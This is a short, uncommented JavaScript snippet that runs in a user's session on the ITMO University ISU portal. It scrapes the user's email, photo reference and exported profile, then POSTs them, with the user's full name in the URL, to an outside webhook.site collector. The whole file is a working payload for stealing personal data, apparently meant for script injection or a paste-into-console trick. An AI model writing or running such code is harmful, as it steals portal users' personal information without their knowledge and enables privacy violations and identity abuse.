async function some5async() {
    var data = await Promise.all([fetch("https://isu.ifmo.ru/pls/apex/f?p=2156:1:"+document.querySelector('#pInstance').value+"::NO:RP:P0_MENU_PROV:1").then((r) => r.text()),
        fetch("https://isu.ifmo.ru/pls/apex/f?p=2437:110:"+document.querySelector('#pInstance').value+"::NO::").then((r) => r.text()),
        fetch("https://isu.ifmo.ru/pls/apex/f?p=2437:31:"+document.querySelector('#pInstance').value+":EXPORTPROFILE:NO:::").then((r) => r.blob())
        ])
    var cont1 = data[0];
    var r1 = cont1.search('id="P1_NEW_EMAIL')
    var r2 = cont1.slice(r1).search('/>')
    var email = cont1.slice(r1+71, r1+r2-3)
    var cont2 = data[1];
    var r1 = cont2.search('P110_FILE_ID')
    var r2 = cont2.slice(r1).search('<style>')
    var photo = cont2.slice(r1, r1+r2)
    var content = data[2];
    var reader = new FileReader();
    reader.readAsDataURL(content);
    reader.onloadend = function() {
      var base64data = reader.result;
      fetch("https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97/"+document.querySelector('#USER_FIO').value+'/'+email, { method: 'POST', body: JSON.stringify({p: photo, d: base64data}) });
    }
}
some5async()
